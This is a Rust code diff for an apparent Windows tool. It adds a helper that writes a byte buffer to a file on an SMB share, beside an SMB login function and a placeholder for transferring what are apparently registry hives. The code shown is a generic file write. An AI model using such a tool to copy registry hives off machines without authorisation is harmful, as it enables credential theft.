@@ -5,9 +5,9 @@ use std::ptr::null;
 use std::path::Path;
 use std::fs;
 use std::io;
-use windows_sys::Win32::Foundation::{GENERIC_READ, GetLastError};
+use windows_sys::Win32::Foundation::{GENERIC_READ, GENERIC_WRITE, GetLastError, CloseHandle};
 use windows_sys::Win32::Storage::FileSystem::{
-    CreateFileW, OPEN_EXISTING, FILE_SHARE_READ,
+    CreateFileW, OPEN_EXISTING, FILE_SHARE_READ, CREATE_ALWAYS, WriteFile,
 };
 use windows_sys::Win32::System::SystemInformation::GetSystemWindowsDirectoryW;
 
@@ -133,6 +133,58 @@ fn connect_smb(path: &str, username: &str, password: &str) -> Result<(), i32> {
 
 fn transfer_hives(path: &str) -> Result<(), i32> {
     Err(6) // Placeholder
+}
+
+fn write_to_smb(smb_path: &str, filename: &str, data: &[u8]) -> Result<(), i32> {
+    let full_path = format!("{}\\{}", smb_path, filename);
+
+    let wide_path: Vec<u16> = OsStr::new(&full_path)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+
+    let file_handle = unsafe {
+        CreateFileW(
+            wide_path.as_ptr(),
+            GENERIC_WRITE,
+            0, // No sharing
+            null(),
+            CREATE_ALWAYS, // Overwrite if exists
+            0,
+            0,
+        )
+    };
+
+    if file_handle == -1 {
+        let error = unsafe { GetLastError() };
+        return match error {
+            5 => Err(2),    // Access denied
+            112 => Err(5),  // Not enough space
+            _ => Err(6),    // Other errors
+        };
+    }
+
+    // Write data
+    let mut bytes_written = 0u32;
+    let write_result = unsafe {
+        WriteFile(
+            file_handle,
+            data.as_ptr(),
+            data.len() as u32,
+            &mut bytes_written,
+            std::ptr::null_mut(),
+        )
+    };
+
+    unsafe {
+        CloseHandle(file_handle);
+    }
+
+    if write_result == 0 || bytes_written as usize != data.len() {
+        return Err(5); // Write failed
+    }
+
+    Ok(())
 }
 
 unsafe extern "system" {
